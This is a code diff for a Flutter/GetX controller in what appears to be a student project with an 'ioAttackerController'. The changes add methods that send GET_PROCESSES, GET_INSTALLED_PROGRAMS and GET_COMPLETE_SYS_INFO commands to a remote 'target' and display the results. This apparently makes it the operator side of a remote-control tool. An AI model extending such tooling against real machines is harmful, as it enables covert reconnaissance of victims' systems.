@@ -1,8 +1,12 @@
 import 'package:flutter/material.dart';
 import 'package:get/get.dart';
+import 'package:get/get_rx/get_rx.dart';
+import 'package:get/get_rx/src/rx_types/rx_types.dart';
 import 'package:inferno_core_fyp/models/process_model.dart';
+import 'package:inferno_core_fyp/res/helper_extensions.dart';
 
 import '../../models/hardware_info_model.dart';
+import '../../models/programs_model.dart';
 import '../../utils/utils.dart';
 import 'io_attacker_controller.dart';
 
@@ -22,6 +26,8 @@ class GeneralController extends GetxController {
       showInTable = ''.obs;
   RxInt maxLines = 1.obs;
 
+  RxDouble cpuUsage = 0.0.obs, usedRam = 0.0.obs, totalRam = 1.0.obs;
+
   Rx<HardwareInfo> hardwareInfo = HardwareInfo(
     cpuUsage: '',
     ramUsage: RamUsage(totalGb: 0, usedGb: 0),
@@ -33,6 +39,7 @@ class GeneralController extends GetxController {
 
   RxList<DataRow> networkData = <DataRow>[].obs;
   RxList<Process> processes = <Process>[].obs;
+  RxList<Program> programs = <Program>[].obs;
 
   final generalController = TextEditingController().obs;
 
@@ -211,36 +218,46 @@ class GeneralController extends GetxController {
 
   Future<void> getProcesses(String targetId) async {
     await Future.delayed(const Duration(seconds: 1));
-    if (processes.isEmpty) {
-      try {
-        Map<String, dynamic> response =
-            await ioAttackerController.executeCommand(
-          targetId: targetId,
-          data: {"text": "GET_PROCESSES", "command_args": {}},
-        );
-        List<dynamic> jsonData = response['result'];
-        processes.value =
-            jsonData.map((data) => Process.fromJson(data)).toList();
-      } catch (e) {
-        Utils.toastMsg("Error: $e");
-      }
+    try {
+      Map<String, dynamic> response = await ioAttackerController.executeCommand(
+        targetId: targetId,
+        data: {"text": "GET_PROCESSES", "command_args": {}},
+      );
+      List<dynamic> jsonData = response['result'];
+      processes.value = jsonData.map((data) => Process.fromJson(data)).toList();
+    } catch (e) {
+      Utils.toastMsg("Error: $e");
+    }
+  }
+
+  Future<void> getPrograms(String targetId) async {
+    await Future.delayed(const Duration(seconds: 1));
+
+    try {
+      Map<String, dynamic> response = await ioAttackerController.executeCommand(
+        targetId: targetId,
+        data: {"text": "GET_INSTALLED_PROGRAMS", "command_args": {}},
+      );
+      Programs programsList = Programs.fromJson(response['result']);
+      programs.value = programsList.programs;
+    } catch (e) {
+      Utils.toastMsg("Error: $e");
     }
   }
 
   Future<void> getHardwareInfo(String targetId) async {
     await Future.delayed(const Duration(seconds: 1));
-    if (hardwareInfo.value.cpuUsage == '') {
-      try {
-        Map<String, dynamic> response =
-            await ioAttackerController.executeCommand(
-          targetId: targetId,
-          data: {"text": "GET_COMPLETE_SYS_INFO", "command_args": {}},
-        );
-        hardwareInfo.value = HardwareInfo.fromJson(response);
-      } catch (e) {
-        Utils.toastMsg("Error: $e");
-      }
+    try {
+      Map<String, dynamic> response = await ioAttackerController.executeCommand(
+        targetId: targetId,
+        data: {"text": "GET_COMPLETE_SYS_INFO", "command_args": {}},
+      );
+      hardwareInfo.value = HardwareInfo.fromJson(response);
+      cpuUsage.value = hardwareInfo.value.cpuUsage.toPercentageValue();
+      usedRam.value = hardwareInfo.value.ramUsage.usedGb.roundOff(1);
+      totalRam.value = hardwareInfo.value.ramUsage.totalGb.roundOff(1);
+    } catch (e) {
+      Utils.toastMsg("Error: $e");
     }
   }
-
 }
